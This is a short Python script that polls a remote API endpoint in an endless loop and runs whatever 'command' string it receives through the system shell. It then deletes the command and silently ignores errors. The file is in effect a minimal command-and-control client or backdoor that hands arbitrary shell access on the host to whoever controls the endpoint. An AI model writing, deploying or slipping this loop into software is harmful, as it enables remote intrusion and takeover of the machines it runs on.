from lib.ApiClient import ApiClient
import subprocess

def terminal(command):
    try:
        if isinstance(command, list):
            for cmd in command:
                subprocess.run(cmd, shell=True)
        elif isinstance(command, str):
            subprocess.run(command, shell=True)
    except:
        pass

def main():
    url = "https://www.example.com/api"
    apiKey = "your_secret_api_key"
    client = ApiClient(url, apiKey)

    lastResponse = None
    while True:
        try:
            response = client.get("command")
            if response != lastResponse:
                lastResponse = response
                command = response.get("command")
                if command:
                    terminal(command)
                    client.delete("command")
        except Exception as e:
            print(f"[ERROR]: {e}")

if __name__ == "__main__":
    main()
